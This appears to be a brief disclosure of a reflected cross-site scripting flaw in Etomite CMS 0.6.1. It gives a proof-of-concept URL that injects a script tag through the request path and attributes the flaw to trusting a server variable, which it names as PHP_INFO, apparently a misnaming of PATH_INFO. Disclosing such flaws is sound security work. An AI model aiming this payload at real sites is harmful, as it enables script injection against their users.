Subject: etomite xss

Homepage: http://www.etomite.com/
Tested Version: 0.6.1 Final
Exploit:http://localhost/etomite0614/index.php/%22%3E%3Cscript%3Ealert(%22test%22)%3C/script%3E/fill
This is a flaw because $_SERVER['PHP_INFO'] is being  trusted.
$_SERVER['PHP_INFO'] will contain this value when the exploit url is used:
/index.php/"><script>alert("test")</script>/fill
/fill is removed.

Trust no one.
